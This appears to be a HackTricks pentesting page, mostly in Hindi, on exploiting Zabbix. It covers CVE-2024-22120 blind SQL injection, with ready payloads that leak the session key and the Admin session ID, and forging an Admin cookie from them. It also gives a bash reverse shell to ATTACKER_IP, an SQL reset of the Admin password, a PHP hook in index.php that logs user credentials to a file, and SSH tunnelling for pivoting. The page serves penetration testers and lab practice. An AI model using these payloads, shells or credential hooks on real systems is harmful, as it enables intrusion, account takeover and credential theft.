# Zabbix सुरक्षा

{{#include ../../banners/hacktricks-training.md}}

## Overview

Zabbix एक monitoring प्लेटफ़ॉर्म है जो एक web UI (आमतौर पर Apache/Nginx के पीछे) और एक server component एक्सपोज़ करता है जो TCP/10051 (server/trapper) पर Zabbix protocol और agent के लिए TCP/10050 पर संवाद करता है। engagements के दौरान आप निम्न मिला सकते हैं:

- Web UI: HTTP(S) virtual host जैसे zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Useful cookie format: zbx_session एक compact JSON ऑब्जेक्ट का Base64 है जिसमें कम से कम sessionid, serverCheckResult, serverCheckTime और sign शामिल होते हैं। sign JSON payload का एक HMAC है।

## zbx_session cookie internals

Recent Zabbix versions cookie को इस तरह compute करते हैं:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

यदि आप global session_key और एक valid admin sessionid recover कर लें, तो आप offline में एक वैध Admin cookie forge कर के UI में authenticate कर सकते हैं।

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

Affected versions (as publicly documented):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Vulnerability summary:

- जब कोई Script execution Zabbix Server audit log में record होती है, तो clientip field sanitize नहीं की जाती और SQL में concatenated हो जाती है, जिससे server component के जरिए time-based blind SQLi संभव हो जाता है।
- यह तभी exploitable है जब आप एक crafted "command" request Zabbix server port 10051 पर भेजें जिसमें एक valid low-privileged sessionid, उस hostid तक पहुँच जो user के पास है, और एक permitted scriptid शामिल हो।

Preconditions and discovery tips:

- sessionid: web UI में guest/login से, zbx_session (Base64) decode करके sessionid प्राप्त करें।
- hostid: web UI requests (e.g., Monitoring → Hosts) में देखें या proxy से intercept करें; सामान्य default अक्सर 10084 होता है।
- scriptid: केवल वर्तमान role को permitted scripts ही execute होंगे; script menu/AJAX responses देखकर verify करें। Defaults जैसे 1 या 2 अक्सर allowed होते हैं; 3 deny हो सकता है।

### Exploitation flow

1) Trigger audit insert with SQLi in clientip

- TCP/10051 से connect करें और request="command" वाला एक Zabbix framed message भेजें जिसमें sid, hostid, scriptid शामिल हों और clientip को एक SQL expression पर सेट किया गया हो जो server द्वारा concatenated और evaluate किया जाएगा।

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
पूर्ण वायर फॉर्मेट है: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. आप pwntools या अपना socket code इस्तेमाल करके इसे frame कर सकते हैं।

2) Time-bruteforce secrets via conditional sleep

conditional expressions का उपयोग करके response time मापकर hex-encoded secrets को 1 char at a time leak किया जा सकता है। प्रयोग में काम करने वाले उदाहरण:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- sessions से Admin session_id (userid=1) को leak करें:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
नोट्स:

- charset: 32 hex chars [0-9a-f]
- Pick T_TRUE >> T_FALSE (e.g., 10 vs 1) and measure wall-clock per attempt
- Ensure your scriptid is actually authorized for the user; otherwise no audit row is produced and timing won’t work

3) Forge Admin cookie

एक बार जब आपके पास हो:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

गणना करें:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

इस मान के लिए cookie zbx_session सेट करें और Admin access सत्यापित करने के लिए GET /zabbix.php?action=dashboard.view पर जाएँ।

### Ready-made tooling

- Public PoC automates: bruteforce of session_key and admin sessionid, and cookie forging; requires pwntools and requests.
- Parameters to provide typically include: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, and optionally a known --admin-sid to skip brute.

## RCE via Script execution (post-Admin)

With Admin access in the UI, you can execute predefined Scripts against monitored hosts. If agents/hosts execute script commands locally, this yields code execution on those systems (often as the zabbix user on Linux hosts):

- Quick check: run id to confirm user context
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY अपग्रेड (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
यदि आपके पास DB access है, cookie को forging करने के बजाय एक विकल्प Admin password को "zabbix" के लिए दस्तावेजीकृत bcrypt में reset करना है:
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

यदि web UI सर्वर पर file write संभव है, तो आप अस्थायी रूप से /usr/share/zabbix/index.php में form-based login branch के आसपास एक logging snippet जोड़कर credentials capture कर सकते हैं:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
यूज़र्स सामान्य रूप से authenticate करते हैं; बाद में /dev/shm/creds.txt पढ़ें। काम पूरा होने पर hook हटाएँ।

## Pivoting to internal services

भले ही service account shell /usr/sbin/nologin हो, SSH में एक authorized_keys entry जोड़ने और -N -L का उपयोग करने से local port-forwarding loopback-only services (e.g., CI/CD at 8111) तक संभव हो जाता है:
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
अधिक tunneling पैटर्न देखने के लिए: [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md) देखें।

## ऑपरेशनल सुझाव

- सुनिश्चित करें कि scriptid वर्तमान role के लिए अनुमत है (guest के पास सीमित सेट हो सकता है)
- Timing brute धीमा हो सकता है; पुनर्प्राप्त admin sessionid को cache करें और पुनः उपयोग करें
- 10051 पर भेजे गए JSON को ZBXD\x01 header और little-endian length के साथ framed होना चाहिए

## संदर्भ

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
